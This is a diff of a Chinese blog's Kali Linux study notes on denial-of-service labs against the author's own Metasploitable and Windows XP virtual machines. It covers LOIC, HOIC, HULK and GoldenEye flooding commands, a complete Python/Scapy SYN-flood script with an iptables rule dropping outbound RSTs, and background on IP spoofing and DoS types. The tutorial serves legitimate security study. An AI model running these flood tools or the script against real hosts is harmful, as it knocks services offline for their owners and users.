+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>使用LOIC攻击进行尝试，浏览器访问Metasploit尝试连接（更改Attack options进行尝试）</li>
+<li>使用HOIC攻击进行尝试，浏览器访问Metasploit尝试连接（不要下载Booster）</li>
+<li>使用DDoSer攻击进行尝试，浏览器访问Metasploit尝试连接（字符界面）</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/LOIC.PNG" alt="LOIC"></p>
+<p><img src="/images/kali/kali-notepad/HOIC.PNG" alt="HOIC"></p>
+<p><img src="/images/kali/kali-notepad/DDoSer.PNG" alt="DDoSer"></p>
+<h4 id="10-实验–HULK"><a href="#10-实验–HULK" class="headerlink" title="10. 实验–HULK"></a>10. 实验–HULK</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>从物理机拷贝HULK工具</li>
+<li><strong><code>🔺命令：python hulk.py http://Metasploit的IP地址</code></strong></li>
+<li>开启Wireshark抓包，Fllow → TCP Stream 查看GET数据包情况（多个数据包分析）</li>
+<li>浏览器访问Metasploit尝试连接</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/HULK.PNG" alt="HULK"></p>
+<h4 id="11-实验–GoldenEye"><a href="#11-实验–GoldenEye" class="headerlink" title="11. 实验–GoldenEye"></a>11. 实验–GoldenEye</h4><ul>
+<li>Metasploit<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：top</code></strong>查看系统资源</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li><strong><code>🔺命令：wget https://github.com/jseidl/GoldenEye/archive/master.zip</code></strong> </li>
+<li><strong><code>🔺命令：unzip master.zip</code></strong> </li>
+<li><strong><code>🔺命令：./goldeneye.py http://Metasploit的IP地址 -w 50</code></strong></li>
+<li>浏览器访问Metasploit尝试连接</li>
+<li>开启Wireshark抓包，查看数据包</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/GoldenEye.PNG" alt="GoldenEye"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82DoS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2034,719 +2959,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/" itemprop="url">Kali Linux笔记(七十九)：Syn-Flood</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:23:36+08:00">
-                2020-02-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  727 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Syn-Flood"><a href="#1-Syn-Flood" class="headerlink" title="1. Syn-Flood"></a>1. Syn-Flood</h4><ul>
-<li>常伴随IP欺骗<ul>
-<li>真正的攻击目标</li>
-</ul>
-</li>
-<li>Scapy<ul>
-<li>i=IP()</li>
-<li>i.dst=1.1.1.1</li>
-<li>i.display()</li>
-<li>t=TCP()</li>
-<li>sr1(i/t,verbose=1,timeout=3)</li>
-<li>sr1(IP(dst=1.1.1.1)/TCP())</li>
-</ul>
-</li>
-<li>▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/Syn-Flood.PNG" alt="Syn-Flood"></p>
-<h4 id="2-实验–准备"><a href="#2-实验–准备" class="headerlink" title="2. 实验–准备"></a>2. 实验–准备</h4><ul>
-<li>Kali（攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Metasploit（Linux被攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Window XP SP3（Winodws被轰击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验–Linux"><a href="#3-实验–Linux" class="headerlink" title="3. 实验–Linux"></a>3. 实验–Linux</h4><ul>
-<li>Metasploit（Linux被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>查看开放的端口（TCP端口，<strong><code>🔺命令：netstat -pantu</code></strong>查看）</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>Scapy<ul>
-<li>i=IP()</li>
-<li>i.dst=”Metasploit的IP”</li>
-<li>i.display()</li>
-<li>t=TCP()</li>
-<li>t.dport=22</li>
-<li>t.display()（查看发包是否flags=S）</li>
-<li>sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）</li>
-</ul>
-</li>
-<li>▲ sr1(IP(dst=”Metasploit的IP”)/TCP())</li>
-<li>开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包</li>
-<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP</code></strong></li>
-<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
-<li>重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包</li>
-<li>先连接<strong><code>🔺命令：ssh msfadmin@Metasploit的IP</code></strong>，尝试连接速度是否延迟</li>
-<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Metasploit的IP 22 200</code></strong></li>
-<li>在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./syn_flood.py [IP端口] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./syn_flood.py 1.1.1.1 80 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行SYN Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def synflood(target,port):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Metasploit（Linux被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU和内存是否提高或者不变</li>
-<li>查看TCP连接：<strong><code>🔺命令：netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="4-实验–Window"><a href="#4-实验–Window" class="headerlink" title="4. 实验–Window"></a>4. 实验–Window</h4><ul>
-<li>Window XP SP3（Winodws被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>关闭防火墙</li>
-<li>开启远程桌面，设置administrator密码（空密码不允许登陆）</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li><strong><code>🔺命令：rdesktop</code></strong>尝试登陆，连接速度是否延迟</li>
-<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP</code></strong></li>
-<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
-<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Window XP SP3的IP 3389 10</code></strong></li>
-<li>在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆</li>
-</ul>
-</li>
-<li>▲ Windows系统默认半开连接数10个</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/" itemprop="url">Kali Linux笔记(七十八)：TCP连接、IP地址欺骗</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:09:14+08:00">
-                2020-02-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  185 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h4><p><img src="/images/kali/kali-notepad/TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG" alt="TCP协议过程"></p>
-<ul>
-<li>TCP三次握手<ul>
-<li>▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG" alt="TCP三次握手"></p>
-<ul>
-<li>TCP四次挥手</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG" alt="TCP四次挥手"></p>
-<h4 id="2-IP地址欺骗"><a href="#2-IP地址欺骗" class="headerlink" title="2. IP地址欺骗"></a>2. IP地址欺骗</h4><ul>
-<li>经常用于DoS攻击</li>
-<li>根据IP头地址寻址<ul>
-<li>伪造IP源地址</li>
-</ul>
-</li>
-<li>边界路由过滤器<ul>
-<li>入站、出站</li>
-</ul>
-</li>
-<li>受害者可能是源、目的地址</li>
-<li>绕过基于地址的验证</li>
-<li>压力测试模拟多用户</li>
-<li>上层协议（TCP序列号）▲ TCP链路劫持</li>
-<li>▲ ISP设置出站流量的策略，对伪造源地址出站流量的过滤（边界防火墙）</li>
-<li>▲ ISP设置入站流量的策略，对伪造内网地址入站流量的过滤（边界防火墙） </li>
-</ul>
-<p><img src="/images/kali/kali-notepad/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG" alt="IP地址欺骗"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/" itemprop="url">Kali Linux笔记(七十七)：DoS介绍及分类</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:06:41+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  607 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-拒绝服务"><a href="#1-拒绝服务" class="headerlink" title="1. 拒绝服务"></a>1. 拒绝服务</h4><ul>
-<li>DoS不是DOS<ul>
-<li>利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务</li>
-</ul>
-</li>
-<li>DDoS分布式拒绝服务<ul>
-<li>一对一的攻击完全拼各自的资源，效果差</li>
-<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
-</ul>
-</li>
-<li>历史<ul>
-<li>以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）</li>
-<li>现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）<ul>
-<li>电商网站被勒索，Bill gates僵尸程序</li>
-<li>贩卖和租用肉鸡已经称为黑产中重要的一部分</li>
-<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Anonymous匿名者<ul>
-<li>世界最著名的黑客组织</li>
-<li>组织结构宽松，人员来自世界各地</li>
-<li>以DDoS攻击著称的无政府主义者</li>
-<li>亦正亦邪，攻击恐怖组织也攻击政府宗教机构</li>
-<li>近些年来涉足政治斗争</li>
-<li>成员露面时均带有Guy Fawkes面具</li>
-<li>最早的核心成员来自4chan图片社区</li>
-<li>惯常雇佣外围黑客成员发动DDoS</li>
-<li>口号：<ul>
-<li>We are Anonymous,We are a Legion,We do not forgive,We do not forget,<br>Expect us.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/%E5%8C%BF%E5%90%8D%E8%80%85.PNG" alt="Anonymous匿名者"></p>
-<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2. DoS分类"></a>2. DoS分类</h4><ul>
-<li>D网络<ul>
-<li>基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）</li>
-<li>ICMP Flood、UDP Flood</li>
-</ul>
-</li>
-<li>D协议<ul>
-<li>攻击协议漏洞发起的拒绝服务攻击</li>
-<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL</li>
-<li>▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）</li>
-<li>▲ ARP（基于传闻的协议，发送即被接受）</li>
-</ul>
-</li>
-<li>D应用<ul>
-<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
-<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
-<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
-<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-为何被DoS"><a href="#3-为何被DoS" class="headerlink" title="3. 为何被DoS"></a>3. 为何被DoS</h4><ul>
-<li>从攻击者到被害者<ul>
-<li>网络（网络设备等）→ FireWall → 服务器OS → 服务应用</li>
-</ul>
-</li>
-<li>资源耗尽<ul>
-<li>网络：带宽</li>
-<li>Firewall：吞吐量、并发连接</li>
-<li>服务器：CPU、内存、I/O</li>
-<li>应用：处理请求能力、对OS资源的使用权</li>
-</ul>
-</li>
-<li>程序漏洞攻击<ul>
-<li>缓冲区溢出</li>
-<li>协议、程序逻辑漏洞</li>
-</ul>
-</li>
-<li>链路上任何一点都可成为目标</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/DoS%E9%93%BE%E8%B7%AF.PNG" alt="DoS链路"></p>
-<h4 id="4-DDoS分类方法"><a href="#4-DDoS分类方法" class="headerlink" title="4. DDoS分类方法"></a>4. DDoS分类方法</h4><p><img src="/images/kali/kali-notepad/DDoS%E5%88%86%E7%B1%BB%E6%96%B9%E6%B3%95.PNG" alt="DDoS分类方法"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2801,7 +3013,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">181</span>
+                  <span class="site-state-item-count">184</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2812,7 +3024,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2823,7 +3035,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -2908,7 +3120,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">176.3k</span>
+    <span title="Site words total count">179.7k</span>
   
 </div>
 
